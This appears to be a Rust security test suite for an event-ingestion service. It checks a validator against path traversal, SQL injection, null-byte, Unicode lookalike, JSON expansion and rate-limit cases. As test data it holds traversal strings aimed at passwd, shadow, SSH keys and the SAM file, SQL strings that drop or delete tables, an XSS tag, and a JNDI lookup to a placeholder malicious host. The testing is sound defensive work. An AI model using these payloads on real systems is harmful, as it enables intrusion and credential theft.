// # Security Test Suite
//
// Comprehensive security testing consolidating all security-related adversarial tests.
// This module validates the system's resilience against various attack vectors.
//
// ## Test Categories
// - **Path Traversal**: Directory traversal and filesystem attacks
// - **SQL Injection**: Database injection attack protection
// - **Input Validation**: Malformed and malicious input handling
// - **Resource Exhaustion**: DoS and resource consumption attacks
// - **Query Interface**: API security and exploit prevention
// - **Unicode Exploits**: Character encoding and normalization attacks

use crate::common::prelude::*;
use crate::common::resources;
use sinex_db::validation::EventValidator;
use sinex_events::{EventFactory, services, event_types};
use std::fs;
use std::collections::HashMap;

/// Security test scenario definition
#[derive(Debug, Clone)]
struct SecurityScenario {
    name: &'static str,
    category: SecurityCategory,
    payload: SecurityPayload,
    expected_behavior: ExpectedBehavior,
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
enum SecurityCategory {
    PathTraversal,
    SqlInjection,
    CommandInjection,
    XssInjection,
    JsonAttack,
    UnicodeExploit,
    ResourceExhaustion,
    ConfigurationInjection,
    PrototypePollution,
    FormatString,
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
enum SecurityPayload {
    String(String),
    Json(Value),
    Binary(Vec<u8>),
}

#[derive(Debug, Clone, PartialEq)]
enum ExpectedBehavior {
    Rejected,        // Should be rejected outright
    Sanitized,       // Should be accepted but sanitized
    AcceptedAsData,  // Should be accepted as harmless data
    ResourceLimited, // Should hit resource limits
}

// =============================================================================
// Path Traversal Security Tests
// =============================================================================

/// Test filesystem monitoring against path traversal attacks
#[sinex_test]
async fn test_filesystem_path_traversal_protection(ctx: TestContext) -> TestResult {
    let temp_dir = resources::temp_dir()?;
    let watch_root = temp_dir.path();

    // Create legitimate directories
    let legitimate_dir = watch_root.join("legitimate");
    fs::create_dir_all(&legitimate_dir)?;

    // Create a sensitive directory outside watch root
    let sensitive_dir = temp_dir.path().parent().unwrap().join("sensitive");
    fs::create_dir_all(&sensitive_dir)?;
    fs::write(sensitive_dir.join("secret.txt"), "SECRET_DATA")?;

    // Test various path traversal attack patterns
    let attack_paths = vec![
        "../sensitive/secret.txt",
        "..\\sensitive\\secret.txt", // Windows-style
        "../../sensitive/secret.txt",
        "legitimate/../../sensitive/secret.txt",
        "legitimate/../../../sensitive/secret.txt",
        "./../../sensitive/secret.txt",
        "legitimate/../sensitive/../sensitive/secret.txt",
        "%2e%2e%2fsensitive%2fsecret.txt",   // URL encoded
        "..%252fsensitive%252fsecret.txt",   // Double encoded
        "..%c0%afsensitive%c0%afsecret.txt", // Unicode bypass attempt
    ];

    let mut traversal_attempts = Vec::new();

    for attack_path in &attack_paths {
        // Simulate filesystem event source trying to resolve path
        let attempted_path = watch_root.join(attack_path);

        // Path normalization should prevent traversal
        let canonical_result = attempted_path.canonicalize();

        match canonical_result {
            Ok(canonical_path) => {
                // Check if canonical path escapes the watch root
                if !canonical_path.starts_with(watch_root) {
                    traversal_attempts.push(format!(
                        "SECURITY VIOLATION: Path '{}' resolved to '{}' (outside watch root '{}')",
                        attack_path,
                        canonical_path.display(),
                        watch_root.display()
                    ));
                }
            }
            Err(_) => {
                // Path doesn't exist - this is acceptable (attack failed)
                println!(
                    "Path traversal blocked: {} (path doesn't exist)",
                    attack_path
                );
            }
        }

        // Test symbolic link attack
        let symlink_attack =
            watch_root.join(format!("symlink_attack_{}", traversal_attempts.len()));
        if std::os::unix::fs::symlink(&sensitive_dir, &symlink_attack).is_ok() {
            if let Ok(symlink_canonical) = symlink_attack.canonicalize() {
                if !symlink_canonical.starts_with(watch_root) {
                    traversal_attempts.push(format!(
                        "SECURITY VIOLATION: Symlink '{}' points outside watch root to '{}'",
                        symlink_attack.display(),
                        symlink_canonical.display()
                    ));
                }
            }
        }
    }

    println!("\nPath Traversal Attack Test Results:");
    println!("  Attack patterns tested: {}", attack_paths.len());
    println!("  Successful traversals: {}", traversal_attempts.len());

    for violation in &traversal_attempts {
        println!("  {}", violation);
    }

    // Security requirement: NO path traversals should succeed
    assert!(
        traversal_attempts.is_empty(),
        "Path traversal attacks succeeded:\n{}",
        traversal_attempts.join("\n")
    );

    println!("  ✓ All path traversal attacks blocked");

    Ok(())
}

/// Test various path traversal attack patterns
#[sinex_test]
async fn test_comprehensive_path_traversal_scenarios(ctx: TestContext) -> TestResult {
    let scenarios = vec![
        SecurityScenario {
            name: "path_traversal_basic",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String("../../../etc/passwd".to_string()),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
        SecurityScenario {
            name: "path_traversal_windows",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String(
                "..\\..\\..\\windows\\system32\\config\\sam".to_string(),
            ),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
        SecurityScenario {
            name: "path_traversal_url_encoded",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string()),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
        SecurityScenario {
            name: "path_traversal_double_encoded",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String("..%252f..%252f..%252fetc%252fpasswd".to_string()),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
        SecurityScenario {
            name: "path_traversal_unicode",
            category: SecurityCategory::PathTraversal,
            payload: SecurityPayload::String("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd".to_string()),
            expected_behavior: ExpectedBehavior::Sanitized,
        },
    ];

    let validator = EventValidator::new();
    let mut security_failures = Vec::new();

    for scenario in scenarios {
        if let SecurityPayload::String(path) = &scenario.payload {
            let event = json!({
                "path": path,
                "size": 1024
            });

            let result = validator.validate_with_rules("fs", "file.created", &event);
            let behavior = match result {
                Ok(_) => ExpectedBehavior::AcceptedAsData,
                Err(_) => ExpectedBehavior::Rejected,
            };

            if behavior != scenario.expected_behavior {
                security_failures.push(format!(
                    "Scenario '{}': Expected {:?}, got {:?}",
                    scenario.name, scenario.expected_behavior, behavior
                ));
            }
        }
    }

    assert!(
        security_failures.is_empty(),
        "Security validation failures:\n{}",
        security_failures.join("\n")
    );

    Ok(())
}

// =============================================================================
// SQL Injection Security Tests
// =============================================================================

/// Test SQL injection protection in event payloads
#[sinex_test]
async fn test_sql_injection_protection(ctx: TestContext) -> TestResult {
    let sql_injection_payloads = vec![
        "'; DROP TABLE events; --",
        "' OR '1'='1' --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "admin'/*",
        "'; INSERT INTO events VALUES ('malicious') --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        "' OR 1=1#",
        "' OR 'a'='a",
        "1'; DELETE FROM events WHERE 1=1 --",
    ];

    let validator = EventValidator::new();
    let mut injection_attempts = Vec::new();

    for payload in sql_injection_payloads {
        let event = json!({
            "command": payload,
            "exit_code": 0,
            "timestamp": "2024-01-01T00:00:00Z"
        });

        let result = validator.validate_with_rules("shell", "command.executed", &event);
        match result {
            Ok(_) => {
                // SQL injection should be accepted as data (not executed)
                println!("SQL injection payload accepted as data: {}", payload);
            }
            Err(e) => {
                injection_attempts.push(format!(
                    "SQL injection payload rejected: {} - {}",
                    payload, e
                ));
            }
        }
    }

    // Insert a test event to ensure database is functional
    let legitimate_event = json!({
        "command": "ls -la",
        "exit_code": 0,
        "timestamp": "2024-01-01T00:00:00Z"
    });

    let factory = EventFactory::new(sources::SHELL_KITTY);
    let event = factory.create_event(event_types::shell::COMMAND_EXECUTED, legitimate_event);
    
    insert_event(ctx.pool(), &event).await?;
    
    println!("SQL injection protection test completed:");
    println!("  Payloads tested: {}", 10);
    println!("  Rejected payloads: {}", injection_attempts.len());
    
    // All SQL injection attempts should be safely handled
    Ok(())
}

// =============================================================================
// Unicode and Character Encoding Security Tests
// =============================================================================

/// Test Unicode normalization bypass attacks
#[sinex_test]
async fn test_unicode_path_normalization_bypass(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();

    // Same path in different Unicode normalizations
    let paths = vec![
        "café.txt",  // NFC (composed)
        "café.txt",  // NFD (decomposed) - looks same but different bytes
        "ﬁle.txt",   // Ligature fi
        "file.txt",  // Regular fi
        "../паѕѕwd", // Cyrillic 'a' and 's' that look like Latin
        "../passwd", // Latin characters
    ];

    for path in &paths {
        let event = json!({
            "path": path,
            "size": 1024
        });

        let result = validator.validate_with_rules("fs", "file.created", &event);
        println!(
            "Path '{}' validation: {:?} (bytes: {:?})",
            path,
            result.is_ok(),
            path.as_bytes()
        );
    }

    // These might bypass security checks due to normalization
    Ok(())
}

/// Test null byte injection in paths
#[sinex_test]
async fn test_null_byte_injection_paths(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();

    // Paths with null bytes - these should be rejected but might not be
    let malicious_paths = vec![
        "/etc/passwd\0.txt",
        "/tmp/\0/../../etc/shadow",
        "file\0\0.txt",
        "\0/etc/passwd",
        "/home/user/.ssh/id_rsa\0.backup",
    ];

    for path in malicious_paths {
        let event = json!({
            "path": path,
            "size": 1024
        });

        match validator.validate_with_rules("fs", "file.created", &event) {
            Ok(_) => println!("VULNERABILITY: Null byte path accepted: {:?}", path),
            Err(e) => println!("Null byte path rejected (good): {:?} - {}", path, e),
        }
    }
    Ok(())
}

// =============================================================================
// JSON Attack Security Tests
// =============================================================================

/// Test JSON hash collision DoS attacks
#[sinex_test]
async fn test_json_hash_collision_dos(ctx: TestContext) -> TestResult {
    // Create JSON object with keys that hash to same bucket
    // This is implementation-specific but common pattern
    let mut collision_object = HashMap::new();

    // These strings often collide in simple hash functions
    let collision_keys = [
        "Aa", "BB", // Often same hash
        "AaAa", "AaBB", "BBAa", "BBBB", // Chain collisions
    ];

    for i in 0..10000 {
        let key = format!("{}{}", collision_keys[i % collision_keys.len()], i);
        collision_object.insert(key, i);
    }

    let start = std::time::Instant::now();
    let json_value = json!(collision_object);
    let _serialized = serde_json::to_string(&json_value);
    let elapsed = start.elapsed();

    println!(
        "Serialization of collision-prone object took: {:?}",
        elapsed
    );

    if elapsed.as_secs() > 1 {
        println!("VULNERABILITY: Hash collision DoS possible!");
    }
    Ok(())
}

/// Test JSON exponential entity expansion attacks
#[sinex_test]
async fn test_json_exponential_entity_expansion(ctx: TestContext) -> TestResult {
    // Billion laughs attack variant for JSON
    let mut expanding_json = json!({
        "level1": {
            "data": "A".repeat(1000)
        }
    });

    // Create nested structure that expands exponentially
    for level in 2..=10 {
        let key = format!("level{}", level);
        expanding_json[key] = json!({
            "data": expanding_json.clone()
        });
    }

    let start = std::time::Instant::now();
    let result = serde_json::to_string(&expanding_json);
    let elapsed = start.elapsed();

    println!(
        "Exponential expansion serialization took: {:?}",
        elapsed
    );

    match result {
        Ok(serialized) => {
            println!("Serialized size: {} bytes", serialized.len());
            if serialized.len() > 100_000_000 {
                println!("VULNERABILITY: Exponential expansion possible!");
            }
        }
        Err(e) => {
            println!("Serialization failed (resource limit hit): {}", e);
        }
    }

    Ok(())
}

// =============================================================================
// Resource Exhaustion Security Tests
// =============================================================================

/// Test memory exhaustion through large payloads
#[sinex_test]
async fn test_memory_exhaustion_large_payloads(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();
    
    // Test progressively larger payloads
    let payload_sizes = vec![1024, 10240, 102400, 1048576, 10485760]; // 1KB to 10MB
    
    for size in payload_sizes {
        let large_data = "A".repeat(size);
        let event = json!({
            "data": large_data,
            "size": size
        });
        
        let start = std::time::Instant::now();
        let result = validator.validate_with_rules("test", "large.payload", &event);
        let elapsed = start.elapsed();
        
        match result {
            Ok(_) => println!("Payload size {} accepted in {:?}", size, elapsed),
            Err(e) => println!("Payload size {} rejected in {:?}: {}", size, elapsed, e),
        }
        
        // Resource exhaustion protection should kick in for very large payloads
        if size > 1048576 && elapsed.as_secs() > 1 {
            println!("VULNERABILITY: Large payload processing too slow!");
        }
    }
    
    Ok(())
}

/// Test concurrent resource exhaustion
#[sinex_test]
async fn test_concurrent_resource_exhaustion(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();
    let concurrent_requests = 100;
    
    let mut handles = Vec::new();
    
    for i in 0..concurrent_requests {
        let validator = validator.clone();
        let handle = tokio::spawn(async move {
            let event = json!({
                "data": "A".repeat(10000),
                "request_id": i
            });
            
            validator.validate_with_rules("test", "concurrent.request", &event)
        });
        handles.push(handle);
    }
    
    let start = std::time::Instant::now();
    let results = futures::future::join_all(handles).await;
    let elapsed = start.elapsed();
    
    let successful = results.iter().filter(|r| r.is_ok()).count();
    
    println!(
        "Concurrent resource exhaustion test: {}/{} successful in {:?}",
        successful, concurrent_requests, elapsed
    );
    
    // System should handle reasonable concurrent load
    assert!(successful > concurrent_requests / 2, 
        "System failed to handle concurrent load: {}/{}", 
        successful, concurrent_requests);
    
    Ok(())
}

// =============================================================================
// Input Validation Security Tests
// =============================================================================

/// Test malformed input validation
#[sinex_test]
async fn test_malformed_input_validation(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();
    
    // Test various malformed inputs
    let malformed_inputs = vec![
        ("invalid_json", json!(null)),
        ("missing_required_field", json!({})),
        ("wrong_type", json!({"size": "not_a_number"})),
        ("negative_size", json!({"size": -1})),
        ("extremely_large_number", json!({"size": u64::MAX})),
    ];
    
    for (test_name, malformed_input) in malformed_inputs {
        let result = validator.validate_with_rules("fs", "file.created", &malformed_input);
        
        match result {
            Ok(_) => println!("VULNERABILITY: {} was accepted", test_name),
            Err(e) => println!("Malformed input '{}' rejected: {}", test_name, e),
        }
    }
    
    Ok(())
}

/// Test input boundary conditions
#[sinex_test]
async fn test_input_boundary_conditions(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();
    
    // Test boundary conditions for various data types
    let boundary_tests = vec![
        ("empty_string", json!({"path": ""})),
        ("max_string_length", json!({"path": "A".repeat(65536)})),
        ("zero_size", json!({"size": 0})),
        ("max_i32", json!({"size": i32::MAX})),
        ("max_u64", json!({"size": u64::MAX})),
        ("negative_timestamp", json!({"timestamp": -1})),
        ("future_timestamp", json!({"timestamp": 4102444800})), // Year 2100
    ];
    
    for (test_name, boundary_input) in boundary_tests {
        let result = validator.validate_with_rules("fs", "file.created", &boundary_input);
        
        match result {
            Ok(_) => println!("Boundary condition '{}' accepted", test_name),
            Err(e) => println!("Boundary condition '{}' rejected: {}", test_name, e),
        }
    }
    
    Ok(())
}

// =============================================================================
// Query Interface Security Tests
// =============================================================================

/// Test query parameter injection
#[sinex_test]
async fn test_query_parameter_injection(ctx: TestContext) -> TestResult {
    // Test various query parameter injection patterns
    let injection_params = vec![
        "'; DROP TABLE events; --",
        "' OR 1=1 --",
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "${jndi:ldap://malicious.com/exploit}",
    ];
    
    for param in injection_params {
        // Simulate query parameter validation
        let query_event = json!({
            "query": param,
            "limit": 100
        });
        
        let validator = EventValidator::new();
        let result = validator.validate_with_rules("query", "executed", &query_event);
        
        match result {
            Ok(_) => println!("Query parameter '{}' accepted as data", param),
            Err(e) => println!("Query parameter '{}' rejected: {}", param, e),
        }
    }
    
    Ok(())
}

/// Test API rate limiting and DoS protection
#[sinex_test]
async fn test_api_rate_limiting_dos_protection(ctx: TestContext) -> TestResult {
    let validator = EventValidator::new();
    let rapid_requests = 1000;
    
    let start = std::time::Instant::now();
    let mut successful_requests = 0;
    let mut rejected_requests = 0;
    
    for i in 0..rapid_requests {
        let event = json!({
            "request_id": i,
            "data": "rapid_request"
        });
        
        let result = validator.validate_with_rules("api", "request.received", &event);
        
        match result {
            Ok(_) => successful_requests += 1,
            Err(_) => rejected_requests += 1,
        }
    }
    
    let elapsed = start.elapsed();
    
    println!(
        "API DoS protection test: {}/{} successful, {}/{} rejected in {:?}",
        successful_requests, rapid_requests,
        rejected_requests, rapid_requests,
        elapsed
    );
    
    // Rate limiting should be in effect for rapid requests
    if elapsed.as_millis() < 100 && successful_requests == rapid_requests {
        println!("VULNERABILITY: No rate limiting detected!");
    }
    
    Ok(())
}
